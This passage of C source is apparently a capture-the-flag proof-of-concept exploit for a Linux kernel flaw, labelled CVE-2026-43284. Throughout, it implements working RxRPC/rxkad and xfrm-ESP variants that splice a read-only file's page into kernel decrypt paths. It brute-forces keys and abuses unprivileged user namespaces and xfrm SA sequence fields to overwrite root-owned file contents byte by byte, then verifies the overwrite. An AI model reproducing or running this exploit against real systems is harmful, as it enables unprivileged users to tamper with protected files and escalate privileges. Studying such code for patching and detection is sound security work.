        c.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE;
        c.hdr.securityIndex = 2;
        c.hdr.serviceId = htons(svc_in);
        c.ch.version = htonl(2);
        c.ch.nonce = htonl(0xDEADBEEFu);
        c.ch.min_level = htonl(1);
        struct sockaddr_in to = { .sin_family = AF_INET,
                                  .sin_port = htons(cli_port),
                                  .sin_addr.s_addr = htonl(0x7F000001) };
        if (sendto(udp_srv, &c, sizeof(c), 0, (struct sockaddr*)&to, sizeof(to)) < 0) {
            poc_log("sendto CHALLENGE failed: %s", strerror(errno));
            goto cleanup_both;
        }
        poc_log("Sent CHALLENGE to port %u", cli_port);
    }

    /* Drain RESPONSE packets (kernel sends response asynchronously) */
    for (int i = 0; i < 4; i++) {
        struct sockaddr_in src;
        if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &src, 500) < 0) break;
    }

    /* Compute cksum for the malicious DATA packet */
    uint8_t csum_iv[8] = {0};
    if (compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv) < 0) {
        poc_log("compute_csum_iv failed");
        goto cleanup_both;
    }
    uint16_t cksum_h = 0;
    if (compute_cksum(cid, callN, 1, SESSION_KEY, csum_iv, &cksum_h) < 0) {
        poc_log("compute_cksum failed");
        goto cleanup_both;
    }

    /* Build malicious DATA header */
    struct rxrpc_wire_header mal = {0};
    mal.epoch = htonl(epoch);
    mal.cid = htonl(cid);
    mal.callNumber = htonl(callN);
    mal.seq = htonl(1);
    mal.serial = htonl(0x42000);
    mal.type = RXRPC_PACKET_TYPE_DATA;
    mal.flags = RXRPC_LAST_PACKET;
    mal.securityIndex = 2;
    mal.cksum = htons(cksum_h);
    mal.serviceId = htons(svc_in);

    /* Connect udp_srv to client port for splice delivery */
    struct sockaddr_in dst = { .sin_family = AF_INET,
                               .sin_port = htons(cli_port),
                               .sin_addr.s_addr = htonl(0x7F000001) };
    if (connect(udp_srv, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
        poc_log("connect udp_srv to cli port failed: %s", strerror(errno));
        goto cleanup_both;
    }

    /* pipe + vmsplice header + splice file → pipe → udp_srv */
    int p[2];
    if (pipe(p) < 0) {
        poc_log("pipe() failed: %s", strerror(errno));
        goto cleanup_both;
    }

    {
        struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };
        if (vmsplice(p[1], &viv, 1, 0) != (ssize_t)sizeof(mal)) {
            poc_log("vmsplice header failed: %s", strerror(errno));
            close(p[0]); close(p[1]);
            goto cleanup_both;
        }
    }
    {
        loff_t off = splice_off;
        ssize_t sn = splice(target_fd, &off, p[1], NULL, 8, SPLICE_F_NONBLOCK);
        if (sn < 8) {
            poc_log("splice file data failed: %s (got %zd)", strerror(errno), sn);
            close(p[0]); close(p[1]);
            goto cleanup_both;
        }
    }
    {
        ssize_t sn = splice(p[0], NULL, udp_srv, NULL,
                            sizeof(mal) + 8, 0);
        if (sn < 0) {
            poc_log("splice pipe->udp failed: %s", strerror(errno));
            close(p[0]); close(p[1]);
            goto cleanup_both;
        }
        poc_log("Spliced %zd bytes (hdr+data) to client port %u", sn, cli_port);
    }
    close(p[0]); close(p[1]);

    /* recvmsg on the client to trigger kernel's rxkad_verify_packet_1 decrypt */
    {
        int fl = fcntl(rxsk_cli, F_GETFL);
        fcntl(rxsk_cli, F_SETFL, fl | O_NONBLOCK);
        for (int round = 0; round < 5; round++) {
            char rb[2048];
            struct sockaddr_rxrpc srx;
            char ccb[256];
            struct msghdr m = {0};
            struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
            m.msg_name = &srx; m.msg_namelen = sizeof(srx);
            m.msg_iov = &iv;  m.msg_iovlen = 1;
            m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
            ssize_t r = recvmsg(rxsk_cli, &m, 0);
            if (r > 0) break;
            if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(20000);
            else break;
        }
        fcntl(rxsk_cli, F_SETFL, fl);
    }

    poc_log("Trigger %d completed (offset=%lld)", g_trigger_seq - 1, (long long)splice_off);
    ret = 0;

cleanup_both:
    if (rxsk_cli >= 0) close(rxsk_cli);
    if (udp_srv >= 0) close(udp_srv);
cleanup_key:
    syscall(SYS_keyctl, 3 /*KEYCTL_INVALIDATE*/, key_id);
    return ret;
}

/* ========================================================================
 * do_rxrpc_exploit - RxRPC variant: brute-force + overlapping 2-byte triggers
 *
 * For each 2-byte pair of write_value, brute-force searches a session
 * key K_i such that fcrypt_decrypt(C_i, K_i)[0..1] == desired bytes.
 * Triggers are issued at overlapping offsets (step=2), so each 8-byte
 * kernel decrypt overwrites the previous trigger's bytes [2..7], but
 * the first 2 bytes "survive" as the final content.
 *
 * Chain computation:
 *   C_0 = file_original[0..7]
 *   C_i = P_{i-1}[2..7] || file_original[2*i+6..2*i+7]
 * ======================================================================== */
static int __attribute__((unused)) do_rxrpc_exploit(const char *target_path, const char *write_value, size_t val_len)
{
    fcrypt_init_sboxes();

    poc_log("=== RxRPC/rxkad exploit path (brute-force + overlapping triggers) ===");

    /* Autoload rxrpc module */
    int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (dummy < 0) {
        poc_log("socket(AF_RXRPC) failed: %s — rxrpc module not available", strerror(errno));
        return -1;
    }
    close(dummy);
    poc_log("rxrpc module autoloaded via socket(AF_RXRPC)");

    /* 1. Read file original content */
    uint8_t file_buf[4096];
    memset(file_buf, 0, sizeof(file_buf));
    ssize_t fsize;
    {
        int fd = open(target_path, O_RDONLY);
        if (fd < 0) {
            poc_log("open(%s) RO failed: %s", target_path, strerror(errno));
            return -1;
        }
        fsize = pread(fd, file_buf, sizeof(file_buf), 0);
        close(fd);
        if (fsize <= 0) {
            poc_log("pread failed or empty file: %s", strerror(errno));
            return -1;
        }
    }
    poc_log("Read %zd bytes from target file", fsize);

    /* 2. Calculate number of overlapping 2-byte triggers */
    size_t padded_len = ((val_len + 1) / 2) * 2;  /* round up to even */
    int num_triggers = (int)(padded_len / 2);
    poc_log("write_value length=%zu, padded=%zu, triggers=%d",
            val_len, padded_len, num_triggers);

    if (num_triggers > 64) {
        poc_log("Too many triggers needed (%d > 64)", num_triggers);
        return -1;
    }

    /* 3. Brute-force search key for each overlapping block */
    uint8_t keys[64][8];     /* session key per trigger */
    uint8_t plains[64][8];   /* decrypt output per trigger (for chaining) */
    uint64_t seed_base = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();

    for (int i = 0; i < num_triggers; i++) {
        off_t offset = (off_t)(i * 2);

        /* Compute "actual ciphertext" at this offset, considering the
         * effect of the previous trigger on overlapping bytes.
         *
         * Each trigger decrypts 8 bytes at file[offset..offset+7].
         * With step=2, trigger i-1 wrote P_{i-1}[0..7] at (i-1)*2.
         * Current offset = i*2 = (i-1)*2 + 2, so:
         *   C[0..5] = P_{i-1}[2..7]  (written by previous trigger)
         *   C[6..7] = original file[offset+6..offset+7]  (untouched)
         */
        uint8_t C[8];
        if (i == 0) {
            memcpy(C, file_buf + offset, 8);
        } else {
            memcpy(C, plains[i - 1] + 2, 6);
            if (offset + 6 < fsize) {
                size_t avail = (size_t)(fsize - offset - 6);
                if (avail > 2) avail = 2;
                memcpy(C + 6, file_buf + offset + 6, avail);
                if (avail < 2) memset(C + 6 + avail, 0, 2 - avail);
            } else {
                memset(C + 6, 0, 2);
            }
        }

        /* Target bytes for this trigger */
        uint8_t want0 = (size_t)(i * 2) < val_len ?
                         (uint8_t)write_value[i * 2] : 0;
        uint8_t want1 = (size_t)(i * 2 + 1) < val_len ?
                         (uint8_t)write_value[i * 2 + 1] : 0;

        poc_log("Block %d: off=%lld C=%02x%02x%02x%02x%02x%02x%02x%02x want=[%02x,%02x]",
                i, (long long)offset,
                C[0], C[1], C[2], C[3], C[4], C[5], C[6], C[7],
                want0, want1);

        if (find_key_for_2bytes(C, want0, want1, keys[i], plains[i],
                                5000000000ULL,
                                seed_base ^ ((uint64_t)i * 0xa5a5a5a5a5a5a5a5ULL)) < 0) {
            poc_log("Brute-force FAILED for block %d (exhausted 5B iters)", i);
            return -1;
        }
        poc_log("Block %d: key found, P[0]=%02x P[1]=%02x",
                i, plains[i][0], plains[i][1]);
    }

    /* 4. Open target file RO for splice triggers */
    int target_fd = open(target_path, O_RDONLY);
    if (target_fd < 0) {
        poc_log("open(%s) for triggers failed: %s", target_path, strerror(errno));
        return -1;
    }

    /* mmap to pin page cache page */
    void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, target_fd, 0);
    if (map == MAP_FAILED) {
        poc_log("mmap failed: %s", strerror(errno));
        close(target_fd);
        return -1;
    }
    poc_log("Target file mapped at %p (page cache pinned)", map);

    /* 5. Execute triggers in order, each with per-trigger SESSION_KEY */
    int success_count = 0;
    for (int i = 0; i < num_triggers; i++) {
        memcpy(SESSION_KEY, keys[i], 8);
        off_t offset = (off_t)(i * 2);

        int block_ok = 0;
        for (int attempt = 0; attempt < 3; attempt++) {
            poc_log("Triggering block %d at offset %lld (attempt %d/3)...",
                    i, (long long)offset, attempt + 1);
            if (do_one_rxrpc_trigger(target_fd, offset) == 0) {
                block_ok = 1;
                break;
            }
            poc_log("Block %d attempt %d failed, %s", i, attempt + 1,
                    attempt < 2 ? "retrying..." : "giving up");
            usleep(50 * 1000);
        }
        if (block_ok) success_count++;
        usleep(50 * 1000);  /* 50ms between triggers */
    }

    poc_log("Completed %d/%d triggers successfully", success_count, num_triggers);

    /* 6. Verify via mmap — use substring search (memmem) */
    usleep(50 * 1000);
    int match = (memmem(map, (size_t)fsize, write_value, val_len) != NULL);
    poc_log("Verification via mmap: %s",
            match ? "MATCH (substring found)" : "MISMATCH");

    munmap(map, 4096);
    close(target_fd);

    return match ? 0 : (success_count > 0 ? -2 : -1);
}

/* ========================================================================
 * ESP/xfrm variant - Fallback for systems without AF_RXRPC
 *
 * Uses unshare(CLONE_NEWUSER|CLONE_NEWNET) to create xfrm SAs with
 * ESN (Extended Sequence Numbers). Each SA's seq_hi field carries 4 bytes
 * of the desired payload. The splice -> UDP -> kernel xfrm_input path
 * writes seq_hi to the page cache, modifying the file content.
 *
 * This variant requires unprivileged user namespace support but does NOT
 * require AF_RXRPC. Works on WSL2 where rxrpc module is unavailable.
 * ======================================================================== */

static int esp_write_proc(const char *path, const char *buf)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, buf, strlen(buf));
    close(fd);
    return n > 0 ? 0 : -1;
}

static int esp_setup_userns_netns(void)
{
    uid_t real_uid = getuid();
    gid_t real_gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        poc_log("ESP: unshare(CLONE_NEWUSER|CLONE_NEWNET): %s", strerror(errno));
        return -1;
    }
    esp_write_proc("/proc/self/setgroups", "deny");
    char map[64];
    snprintf(map, sizeof(map), "0 %u 1", real_uid);
    if (esp_write_proc("/proc/self/uid_map", map) < 0) {
        poc_log("ESP: uid_map: %s", strerror(errno));
        return -1;
    }
    snprintf(map, sizeof(map), "0 %u 1", real_gid);
    if (esp_write_proc("/proc/self/gid_map", map) < 0) {
        poc_log("ESP: gid_map: %s", strerror(errno));
        return -1;
    }
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        poc_log("ESP: socket for lo: %s", strerror(errno));
        return -1;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
        poc_log("ESP: SIOCGIFFLAGS: %s", strerror(errno));
        close(s); return -1;
    }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) {
        poc_log("ESP: SIOCSIFFLAGS: %s", strerror(errno));
        close(s); return -1;
    }
    close(s);
    return 0;
}

static void esp_put_attr(struct nlmsghdr *nlh, int type,
                         const void *data, size_t len)
{
    struct rtattr *rta = (struct rtattr *)((char *)nlh +
                          NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len  = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int esp_add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
{
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) return -1;
    struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
    if (bind(sk, (struct sockaddr *)&nl, sizeof(nl)) < 0) {
        close(sk); return -1;
    }

    char buf[4096];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi      = htonl(spi);
    xs->id.proto    = IPPROTO_ESP;
    xs->saddr.a4    = inet_addr("127.0.0.1");
    xs->family      = AF_INET;
    xs->mode        = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid       = 0x1234;
    xs->flags       = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit   = (uint64_t)-1;
    xs->lft.hard_byte_limit   = (uint64_t)-1;
    xs->lft.soft_packet_limit = (uint64_t)-1;
    xs->lft.hard_packet_limit = (uint64_t)-1;
    xs->sel.family  = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    /* Auth: hmac(sha256) */
    {
        char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
        aa->alg_key_len   = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        esp_put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
    }
    /* Encrypt: cbc(aes) */
    {
        char alg_buf[sizeof(struct xfrm_algo) + 16];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        esp_put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
    }
    /* Encap: ESP-in-UDP */
    {
        struct xfrm_encap_tmpl enc;
        memset(&enc, 0, sizeof(enc));
        enc.encap_type  = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ESP_ENC_PORT);
        enc.encap_dport = htons(ESP_ENC_PORT);
        enc.encap_oa.a4 = 0;
        esp_put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    /* ESN replay state with desired seq_hi */
    {
        char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
        memset(esn_buf, 0, sizeof(esn_buf));
        struct xfrm_replay_state_esn *esn =
            (struct xfrm_replay_state_esn *)esn_buf;
        esn->bmp_len       = 1;
        esn->oseq          = 0;
        esn->seq           = ESP_REPLAY_SEQ;
        esn->oseq_hi       = 0;
        esn->seq_hi        = patch_seqhi;
        esn->replay_window = 32;
        esp_put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
    char rbuf[4096];
    ssize_t n = recv(sk, rbuf, sizeof(rbuf), 0);
    if (n < 0) { close(sk); return -1; }
    struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) { close(sk); return -1; }
    }
    close(sk);
    return 0;
}

static int esp_do_one_write(const char *path, off_t offset, uint32_t spi)
{
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0) return -1;
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa_d = {
        .sin_family = AF_INET,
        .sin_port   = htons(ESP_ENC_PORT),
        .sin_addr   = { inet_addr("127.0.0.1") },
    };
    if (bind(sk_recv, (struct sockaddr *)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_recv); return -1;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP,
                   &encap, sizeof(encap)) < 0) {
        close(sk_recv); return -1;
    }
    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { close(sk_recv); return -1; }
    if (connect(sk_send, (struct sockaddr *)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_send); close(sk_recv); return -1;
    }
    int file_fd = open(path, O_RDONLY);
    if (file_fd < 0) {
        close(sk_send); close(sk_recv); return -1;
    }

    int pfd[2];
    if (pipe(pfd) < 0) {
        close(file_fd); close(sk_send); close(sk_recv); return -1;
    }

    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(spi);
    *(uint32_t *)(hdr + 4) = htonl(ESP_SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
        close(file_fd); close(pfd[0]); close(pfd[1]);
        close(sk_send); close(sk_recv);
        return -1;
    }
    loff_t off = offset;
    ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
    if (s != 16) {
        close(file_fd); close(pfd[0]); close(pfd[1]);
        close(sk_send); close(sk_recv);
        return -1;
    }
    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
    usleep(150 * 1000);

    close(file_fd); close(pfd[0]); close(pfd[1]);
    close(sk_send); close(sk_recv);
    return s == 40 ? 0 : -1;
}

/* do_esp_exploit - ESP variant: trigger page cache writes via xfrm seq_hi
 *
 * Forks a child process that:
 *   1. unshare(CLONE_NEWUSER | CLONE_NEWNET) for xfrm SA access
 *   2. Installs one xfrm SA per 4-byte chunk of write_value
 *   3. Triggers splice -> UDP -> kernel xfrm_input for each chunk
 *   4. Kernel writes seq_hi (4 bytes) to page cache at each offset
 */
static int do_esp_exploit(const char *target_path, const char *write_value,
                          size_t val_len)
{
    poc_log("=== ESP/xfrm exploit path (user namespace required) ===");

    pid_t pid = fork();
    if (pid < 0) {
        poc_log("ESP: fork() failed: %s", strerror(errno));
        return -1;
    }

    if (pid == 0) {
        /* Child process - exploit in new namespace */
        if (esp_setup_userns_netns() < 0) {
            _exit(1);
        }
        usleep(100 * 1000);

        /* Pad write_value to multiple of 4 */
        size_t padded = ((val_len + 3) / 4) * 4;
        int num_chunks = (int)(padded / 4);

        /* Install xfrm SAs - one per 4-byte chunk */
        for (int i = 0; i < num_chunks; i++) {
            uint32_t spi = 0xDEADBE10 + i;
            uint32_t seqhi = 0;
            for (int j = 0; j < 4; j++) {
                size_t idx = (size_t)(i * 4 + j);
                uint8_t byte = (idx < val_len) ?
                               (uint8_t)write_value[idx] : 0;
                seqhi |= (uint32_t)byte << (24 - j * 8);
            }
            if (esp_add_xfrm_sa(spi, seqhi) < 0) {
                poc_log("ESP: add_xfrm_sa #%d (spi=0x%x seqhi=0x%x) failed",
                        i, spi, seqhi);
                _exit(1);
            }
        }
        poc_log("ESP: installed %d xfrm SAs", num_chunks);

        /* Trigger writes */
        for (int i = 0; i < num_chunks; i++) {
            uint32_t spi = 0xDEADBE10 + i;
            off_t off = (off_t)(i * 4);
            if (esp_do_one_write(target_path, off, spi) < 0) {
                poc_log("ESP: do_one_write #%d at off=%lld failed",
                        i, (long long)off);
            }
        }
        poc_log("ESP: triggered %d writes", num_chunks);
        _exit(0);
    }

    /* Parent - wait for child */
    int status;
    if (waitpid(pid, &status, 0) < 0) {
        poc_log("ESP: waitpid failed: %s", strerror(errno));
        return -1;
    }

    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        poc_log("ESP: child exited with error (status=0x%x)", status);
        return -1;
    }

    /* Verify via mmap */
    usleep(100 * 1000);
    int rfd = open(target_path, O_RDONLY);
    if (rfd < 0) {
        poc_log("ESP: open for verify failed: %s", strerror(errno));
        return -1;
    }
    void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd, 0);
    if (map == MAP_FAILED) {
        close(rfd);
        poc_log("ESP: mmap for verify failed: %s", strerror(errno));
        return -1;
    }
    int match = (memcmp(map, write_value, val_len) == 0);
    poc_log("ESP: Verification via mmap: %s", match ? "MATCH" : "MISMATCH");
    munmap(map, 4096);
    close(rfd);

    return match ? 0 : -1;
}

/* ========================================================================
 * mode_read_root_file - CTF Read Mode
 * ======================================================================== */
static int mode_read_root_file(poc_args_t *args)
{
    char buf[MAX_FILE_SIZE];

    poc_log("=== Mode: read_root_file ===");
    poc_log("Target: %s", args->root_file);

    int fd = open(args->root_file, O_RDONLY);
    poc_log_syscall("open(root_file, O_RDONLY)", (long)fd, errno);
    if (fd < 0) {
        poc_print_fail("cannot open target file for reading");
        printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
        return 1;
    }

    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    poc_log_syscall("read(fd, buf, sizeof(buf))", (long)n, errno);
    close(fd);

    if (n <= 0) {
        poc_print_fail("read returned no data");
        printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
        return 1;
    }

    buf[n] = '\0';
    while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
        buf[--n] = '\0';

    poc_print_flag(buf);
    printf("%s\n", POC_RESULT_EXPLOITABLE);
    return 0;
}

/* ========================================================================
 * mode_write_root_file - CTF Write Mode (ESP variant page cache corruption)
 *
 * Strategy:
 *   Uses ESP/xfrm variant exclusively. This CVE is an xfrm-ESP page cache
 *   pollution vulnerability — only the ESP exploit path is applicable.
 *
 *   ESP directly writes write_value bytes via xfrm SA seq_hi field,
 *   overwriting the writeme_{random} canary via page cache corruption.
 *   Requires unprivileged user namespace support.
 * ======================================================================== */
static int mode_write_root_file(poc_args_t *args)
{
    poc_log("=== Mode: write_root_file ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    size_t val_len = strlen(args->write_value);
    if (val_len == 0) {
        poc_print_fail("write-value is empty");
        printf("%s\n", POC_RESULT_ERROR);
        return 1;
    }
    if (val_len > MAX_FILE_SIZE) {
        poc_print_fail("write-value exceeds maximum size");
        printf("%s\n", POC_RESULT_ERROR);
        return 1;
    }

    /* Step 1: Read original content (writeme_{random} canary from Prepare) */
    char original[MAX_FILE_SIZE];
    memset(original, 0, sizeof(original));
    ssize_t orig_len = 0;
    {
        int fd = open(args->root_file, O_RDONLY);
        poc_log_syscall("open(root_file, O_RDONLY) [before]", (long)fd, errno);
        if (fd < 0) {
            poc_print_fail("cannot open target for initial read");
            printf("%s\n", POC_RESULT_ERROR);
            return 1;
        }
        orig_len = read(fd, original, sizeof(original) - 1);
        poc_log_syscall("read(fd, original)", (long)orig_len, errno);
        close(fd);
        if (orig_len <= 0) {
            poc_print_fail("initial read returned no data");
            printf("%s\n", POC_RESULT_ERROR);
            return 1;
        }
    }
    /* Print initial content as text (writeme_{random} canary is printable) */
    {
        /* Find first null or non-printable to determine display length */
        int dlen = 0;
        for (int i = 0; i < orig_len && i < 64; i++) {
            if (original[i] == '\0' || (unsigned char)original[i] < 0x20)
                break;
            dlen = i + 1;
        }
        poc_log("Read before: %.*s", dlen, original);
    }
    printf("%s%.*s\n", CTF_READ_BEFORE, (int)(orig_len > 64 ? 64 : orig_len), original);

    /* Step 2: Execute exploit (ESP variant only — this CVE is xfrm-ESP specific) */
    poc_log("Using ESP variant exclusively (xfrm-ESP page cache pollution)");
    printf("%s%s (attempting via ESP variant...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int exploit_ret = do_esp_exploit(args->root_file, args->write_value, val_len);

    /* Step 3: Read file to verify */
    char after[MAX_FILE_SIZE];
    memset(after, 0, sizeof(after));
    {
        int fd = open(args->root_file, O_RDONLY);
        poc_log_syscall("open(root_file, O_RDONLY) [verify]", (long)fd, errno);
        if (fd >= 0) {
            ssize_t n = read(fd, after, sizeof(after) - 1);
            poc_log_syscall("read(fd, after) [verify]", (long)n, errno);
            close(fd);
        }
    }
    /* Binary-safe output: only print raw text if content is printable ASCII */
    {
        int is_text = 1;
        for (int i = 0; after[i] != '\0'; i++) {
            unsigned char c = (unsigned char)after[i];
            if (c < 0x20 && c != '\n' && c != '\r' && c != '\t') {
                is_text = 0;
                break;
            }
            if (c > 0x7e) {
                is_text = 0;
                break;
            }
        }
        if (is_text) {
            printf("%s%s\n", CTF_READ_AFTER, after);
            poc_log("Read after (text): %s", after);
        } else {
            printf("%s(binary content)\n", CTF_READ_AFTER);
            poc_log("Read after: binary content (ciphertext unchanged)");
        }
    }

    /* Step 4: Determine result — use memmem substring search */
    size_t after_len = strlen(after);
    if (exploit_ret == 0 ||
        (after_len > 0 && memmem(after, after_len, args->write_value, val_len) != NULL)) {
        poc_log("Write verified: write_value found in file content");
        poc_print_flag(args->write_value);
        printf("%s\n", POC_RESULT_EXPLOITABLE);
        return 0;
    }

    if (strcmp(after, original) != 0) {
        poc_log("Partial corruption: content changed but doesn't match target");
        poc_print_fail("partial page cache corruption (ESP triggered but mismatch)");
        printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
        return 1;
    }

    poc_log("Write failed: content unchanged");
    poc_print_fail("page cache not modified - ESP/xfrm exploit failed");
    printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
    return 1;
}

/* ========================================================================
 * main - CTF Challenge Entry Point
 * ======================================================================== */
int main(int argc, char *argv[])
{
    poc_args_t args = {0};

    /* Override alarm for this PoC */
    alarm(POC_MAX_RUNTIME_SEC);

    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    poc_log_init(args.log_file);

    poc_log("=== CVE-2026-43284 CTF PoC ===");
    poc_log("Vuln: xfrm-ESP page cache pollution via splice (ESP variant only)");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    /* Legacy mode (no arguments) */
    if (!args.mode) {
        poc_log("No --mode specified, running in legacy detection mode");
        const char *target_path = getenv(POC_TARGET_FILE_ENV);
        if (!target_path || target_path[0] == '\0') {
            printf("%s POC_TARGET_FILE not set and no --mode specified\n", POC_STEP_FAIL);
            poc_print_usage(argv[0]);
            printf("\n%s\n", POC_RESULT_ERROR);
            poc_log_close();
            return 1;
        }
        args.mode = POC_MODE_WRITE;
        args.root_file = target_path;
        args.write_value = "XPLT";
        int ret = mode_write_root_file(&args);
        poc_log_close();
        return ret;
    }

    /* CTF mode dispatch */
    poc_log("Mode: %s", args.mode);

    int ret = -1;
    if (strcmp(args.mode, POC_MODE_READ) == 0) {
        ret = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        ret = mode_write_root_file(&args);
    } else {
        poc_print_unsupported(args.mode,
            "This CVE supports write_root_file and read_root_file modes");
        printf("%s\n", POC_RESULT_ERROR);
        ret = 1;
    }

    poc_log_close();
    return ret;
}
